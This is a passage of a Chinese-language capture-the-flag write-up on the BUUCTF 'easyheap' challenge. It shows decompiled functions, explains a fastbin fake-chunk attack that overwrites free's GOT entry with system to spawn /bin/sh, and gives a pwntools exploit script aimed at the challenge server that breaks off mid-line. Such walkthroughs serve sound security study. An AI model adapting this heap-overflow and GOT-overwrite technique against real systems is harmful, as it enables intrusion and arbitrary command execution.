number\">0x28u</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> v3<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h3 id=\"133t后门\"><a class=\"anchor\" href=\"#133t后门\">#</a> 133t（）；【后门】</h3>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c </span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">l33t</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token keyword\">return</span> <span class=\"token function\">system</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"cat /home/pwn/flag\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  <span class=\"token comment\">// 有后门</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h3 id=\"create_heap\"><a class=\"anchor\" href=\"#create_heap\">#</a> create_heap()</h3>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">unsigned</span> __int64 <span class=\"token function\">create_heap</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token keyword\">int</span> i<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+4h] [rbp-1Ch]</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  <span class=\"token class-name\">size_t</span> size<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+8h] [rbp-18h]</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token keyword\">char</span> buf<span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+10h] [rbp-10h] BYREF</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  <span class=\"token keyword\">unsigned</span> __int64 v4<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+18h] [rbp-8h]</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>  v4 <span class=\"token operator\">=</span> <span class=\"token function\">__readfsqword</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x28u</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;=</span> <span class=\"token number\">9</span><span class=\"token punctuation\">;</span> <span class=\"token operator\">++</span>i <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token operator\">!</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>heaparray <span class=\"token operator\">+</span> i<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>      <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Size of Heap : \"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>      <span class=\"token function\">read</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> buf<span class=\"token punctuation\">,</span> <span class=\"token number\">8uLL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>      size <span class=\"token operator\">=</span> <span class=\"token function\">atoi</span><span class=\"token punctuation\">(</span>buf<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>      <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>heaparray <span class=\"token operator\">+</span> i<span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> <span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span>size<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>      <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token operator\">!</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>heaparray <span class=\"token operator\">+</span> i<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>      <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Allocate Error\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        <span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>      <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>      <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Content of heap:\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>      <span class=\"token function\">read_input</span><span class=\"token punctuation\">(</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>heaparray <span class=\"token operator\">+</span> i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> size<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>      <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"SuccessFul\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>      <span class=\"token keyword\">return</span> <span class=\"token function\">__readfsqword</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x28u</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> v4<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>  <span class=\"token keyword\">return</span> <span class=\"token function\">__readfsqword</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x28u</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> v4<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h3 id=\"edit_heap\"><a class=\"anchor\" href=\"#edit_heap\">#</a> edit_heap()</h3>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">unsigned</span> __int64 <span class=\"token function\">edit_heap</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token keyword\">int</span> v1<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+4h] [rbp-1Ch]</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  __int64 v2<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+8h] [rbp-18h]</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token keyword\">char</span> buf<span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+10h] [rbp-10h] BYREF</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  <span class=\"token keyword\">unsigned</span> __int64 v4<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+18h] [rbp-8h]</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>  v4 <span class=\"token operator\">=</span> <span class=\"token function\">__readfsqword</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x28u</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Index :\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>  <span class=\"token function\">read</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> buf<span class=\"token punctuation\">,</span> <span class=\"token number\">4uLL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>  v1 <span class=\"token operator\">=</span> <span class=\"token function\">atoi</span><span class=\"token punctuation\">(</span>buf<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v1 <span class=\"token operator\">&lt;</span> <span class=\"token number\">0</span> <span class=\"token operator\">||</span> v1 <span class=\"token operator\">></span> <span class=\"token number\">9</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Out of bound!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token function\">_exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>heaparray <span class=\"token operator\">+</span> v1<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Size of Heap : \"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token function\">read</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> buf<span class=\"token punctuation\">,</span> <span class=\"token number\">8uLL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    v2 <span class=\"token operator\">=</span> <span class=\"token function\">atoi</span><span class=\"token punctuation\">(</span>buf<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Content of heap : \"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token function\">read_input</span><span class=\"token punctuation\">(</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>heaparray <span class=\"token operator\">+</span> v1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> v2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Done !\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>  <span class=\"token keyword\">else</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"No such heap !\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>  <span class=\"token keyword\">return</span> <span class=\"token function\">__readfsqword</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x28u</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> v4<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h1 id=\"2逻辑分析\"><a class=\"anchor\" href=\"#2逻辑分析\">#</a> 2. 逻辑分析</h1>\n<p>这道题是 <code>堆</code> 的菜单题</p>\n<ul>\n<li><code>main</code>  函数：循环进行选择</li>\n<li><code>delete_heap</code>  函数：选择 <code>Index号</code> （0~9 之间）</li>\n</ul>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/26/pPHJ5o6.png\" alt=\"\" /></p>\n<ul>\n<li><code>133t()</code>  函数，可以得到 flag ，但是需要让 <code>v3=4869</code> ， <code>无符号整型magic&gt;0x1305</code></li>\n<li><code>create_heap()</code> ；</li>\n<li><img data-src=\"https://z1.ax1x.com/2023/09/26/pPHJOOA.png\" alt=\"\" /></li>\n</ul>\n<p>创建完堆也要输入内容</p>\n<ul>\n<li><code>edit_heap</code> ,</li>\n</ul>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/26/pPHJvwt.png\" alt=\"\" /></p>\n<h1 id=\"3漏洞分析\"><a class=\"anchor\" href=\"#3漏洞分析\">#</a> 3. 漏洞分析</h1>\n<p>heaparray_add 存放的是某个地址，而 edit 是通过这个地址，来修改这个地址内对应的值</p>\n<p>当我们把 <code>free_got</code>  的地址溢出填入到 <code>heaparray_add[0]</code>  处，通过编辑使 <code>free_got</code>  内部要执行的 <code>free操作</code> 修改为 <code>system</code> ，这使我们后面调用 <code>free</code>  的时候会执行 <code>system</code> , 当一个 <code>chunk</code>  的 <code>data</code>  区域为 <code>/bin/sh</code>  时，释放该 <code>chunk</code>  即可 <code>getshell</code>  (这里为什么 data 的值被当作了 system 的参数有待考究)</p>\n<p>【下面的想法没成功】</p>\n<p>首先想要获取 flag 就需要让 <code>v3=4869</code> ，由于没有限制我们可以直接输入，而还需要满足 magic 条件，magic 初始值未知，发现创建堆块，和后面编辑的堆块大小都没有限制条件，并且后面编辑也没有和申请的大小进行对比，这样我们就可以进行堆溢出操作，我想到是利用 <s>double free</s>  通过申请两个堆块，然后释放一个，利用溢出改变释放的堆块的 fd，修改 fd 指向 magic 地址，然后申请回来进行编辑值，然后就可以得到 flag 了</p>\n<h2 id=\"调试一下\"><a class=\"anchor\" href=\"#调试一下\">#</a> 调试一下</h2>\n<p><img data-src=\"https://img1.imgtp.com/2023/09/26/ZDif5KYH.png\" alt=\"\" /><br />\n发现有个 <code>tcachebins</code>  , 看了题目上说明是 Ubuntu16，一般 glibc 版本为 2.23-2.26，因此要切换版本</p>\n<p>利用命令：</p>\n<pre><code>patchelf --set-interpreter ~/pwn/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/ld-2.23.so --set-rpath ~/pwn/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/ ~/Desktop/buuctf2/easyheap\n</code></pre>\n<p>切换后就为 fastbin 了（详细的说明在文章 &quot;babyhep_0ctf_2017&quot;）</p>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/26/pPHYbNV.png\" alt=\"\" /></p>\n<p>查看存储情况：（ <code>x/30gx</code> ）</p>\n<p>申请 0，1，2 大小为 0x10，释放 index 1</p>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/26/pPHteud.png\" alt=\"\" /></p>\n<h3 id=\"edit\"><a class=\"anchor\" href=\"#edit\">#</a> edit()</h3>\n<p>选择 index 0，大小为 0x20，输入 eee</p>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/26/pPHt1C8.png\" alt=\"\" /></p>\n<p>可以从上面看到，覆盖了以前的 <code>aaa</code></p>\n<p>试试溢出，选择 index 0，大小为 0x20，输入 <code>aaaabbbbccccddddeeeeffffgggg</code> <br />\n<img data-src=\"https://z1.ax1x.com/2023/09/26/pPHtGvQ.png\" alt=\"\" /></p>\n<p>发现已经被覆盖了（这里不知道是什么原因，输入的值前面总会有个字符 <code>a</code> ）</p>\n<h2 id=\"选择fd指向地址\"><a class=\"anchor\" href=\"#选择fd指向地址\">#</a> 选择 fd 指向地址</h2>\n<p>由于 fd 指向下一个 <code>chunk</code>  的 <code>pre_size</code>  位，这里通常占 0x10 大小（ <code>pre位和size位</code> ），所以我们为了能写入 <code>magic</code>  的位置，所以要让 <code>fd</code>  指向 <code>magic地址</code>  的低地址</p>\n<p>由于不能任意选取地址（因为 malloc 会有检测机制，会在我们申请的时候检测 <code>size</code>  位是否符合，所以我们要构造一个 <code>fake_chunk</code> ）</p>\n<p>先找一个 <code>magic</code>  的低地址，发现有个 0x7f，可以通过适当的偏移来得到一个 <code>0x7f</code> <br />\n<img data-src=\"https://z1.ax1x.com/2023/09/26/pPHBuQK.png\" alt=\"\" /></p>\n<p>这样就找到了一个满足 <code>fake_chunk</code>  的地址（0x6020ad）<br />\n<img data-src=\"https://z1.ax1x.com/2023/09/27/pPHBMLD.png\" alt=\"\" /></p>\n<pre><code>0x6020b0-0x3 = 0x6020ad\n</code></pre>\n<h2 id=\"总结利用方式\"><a class=\"anchor\" href=\"#总结利用方式\">#</a> 总结利用方式</h2>\n<p><s>creat 申请 2 个堆块 0，1；delete 释放 1，利用 edit 溢出到 1，修改 1 的 fd 为 <code>0x6020ad</code> ；收回后该 <code>fake_chunk</code> , 改变 <code>magic</code>  的值，改变最后选择时输入 4869 即可 (没有利用成功)</s></p>\n<p>creat 申请 3 个堆块 0 ,1 , 2 (只用两个行不通，因为申请两个 chunk 的的话，写入 <code>/bin/sh</code>  只能在 chunk0, 而后面会修改  <code>heaparray[0]</code>  的地址为  <code>free_got</code>  的地址，但是 chunk0 访问该地址内容并且可以输入内容，将 <code>free</code>  改为 <code>system</code>  时就会覆盖我们写入的 <code>/bin/sh</code> ，这样无法 getshell ) ，释放堆块 2，利用堆块 1 溢出改变堆块 2 的 fd 的地址为 fake_chunk 地址（溢出时顺便输入字符串 <code>/bin/sh</code> ），此时 fastbin 内： <code>chunk2-&gt;fake_chunk</code> ，再次 creat 两次：先是申请 chunk2，然后申请 <code>fake_chunk</code></p>\n<p>通过溢出 fake_chunk 到 heaparray，修改 heaparray [0] 的内存放的地址为 <code>free_got</code>  ，由于 chunk0 也是根据 <code>heaparray数组</code> 内存放的地址来寻址，修改后就会访问到 <code>free</code>  的内容可以修改成为 <code>system_plt</code> , 这样使用 free 函数时就会执行 <code>system</code> ，这时 <code>free(chunk1)</code>  同等与 <code>system(&quot;/bin/sh&quot;)</code></p>\n<h1 id=\"4exp\"><a class=\"anchor\" href=\"#4exp\">#</a> 4.exp:</h1>\n<p>这里不用 <code>sendline</code>  来换行（因为换行符调了几个小时）</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> LibcSearcher <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>context<span class=\"token punctuation\">.</span>log_level <span class=\"token operator\">=</span> <span class=\"token string\">'debug'</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>p<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">'node4.buuoj.cn'</span><span class=\"token punctuation\">,</span><span class=\"token number\">26996</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\">#system=0x0400700</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>e<span class=\"token operator\">=</span>ELF<span class=\"token punctuation\">(</span><span class=\"token string\">\"./easyheap\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>system_add<span class=\"token operator\">=</span>e<span class=\"token punctuation\">.</span>symbols<span class=\"token punctuation\">[</span><span class=\"token string\">\"system\"</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>free_got<span class=\"token operator\">=</span>e<span class=\"token punctuation\">.</span>got<span class=\"token punctuation\">[</span><span class=\"token string\">\"free\"</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">creat</span><span class=\"token punctuation\">(</span>size<span class=\"token punctuation\">,</span>content<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">\"Your choice :\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"1\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">\"Size of Heap : \"</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>size<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">\"Content of heap:\"</span><span class=\"token punctuation\">,</span>content<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">edit</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">,</span>size<span class=\"token punctuation\">,</span>content<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">\"Your choice :\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"2\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">\"Index :\"</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">\"Size of Heap : \"</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>size<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">\"Content of heap : \"</span><span class=\"token punctuation\">,</span>content<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">delete</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">\"Your choice :\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"3\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">\"Index :\"</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token comment\">#def dump(index):</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    <span class=\"token comment\">#p.sendlineafter(\"Command: \",\"4\")</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    <span class=\"token comment\">#p.sendlineafter(\"Index: \",str(index))</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>creat<span class=\"token punctuation\">(</span><span class=\"token number\">96</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"aaaa\"</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#0</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>creat<span class=\"token punctuation\">(</span><span class=\"token number\">96</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"bbbb\"</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">##1 </span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>creat<span class=\"token punctuation\">(</span><span class=\"token number\">96</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"cccc\\n\"</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#2</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token comment\">#creat(16,\"dddd\\n\") #3</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>delete<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span> </pre></td></tr><tr><td data-num=\"34\"></td><td><pre></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>payload<span class=\"token operator\">=</span><span class=\"token string\">b\"/bin/sh\\x00\"</span><span class=\"token operator\">+</span><span class=\"token string\">b\"a\"</span><span class=\"token operator\">*</span><span class=\"token number\">88</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x71</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x6020ad</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#+b\"a\"*33+p64(free_got)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>edit<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>payload<span class=\"token punctuation\">)</span> <span class=\"token comment\">#0</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>creat<span class=\"token punctuation\">(</span><span class=\"token number\">96</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"aaaa\"</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#1</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre><span class=\"token comment\">#edit(1,0x60,\"/bin/sh\")</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>payload2<span class=\"token operator\">=</span><span class=\"token string\">b\"a\"</span><span class=\"token operator\">*</span><span class=\"token number\">0x20</span><span class=\"token operator\">+</span><span class=\"token string\">b\"aaa\"</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>free_got<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>creat<span class=\"token punctuation\">(</span><span class=\"token number\">96</span><span class=\"token punctuation\">,</span>payload2<span class=\"token punctuation\">)</span> <span class=\"token comment\">#fake_chunk</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre><span class=\"token comment\">#edit(4,len(payload2),payload2)</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>paylaod3 <span class=\"token operator\">=</span> p64<span class=\"token punctuation\">(</span>system_add<span 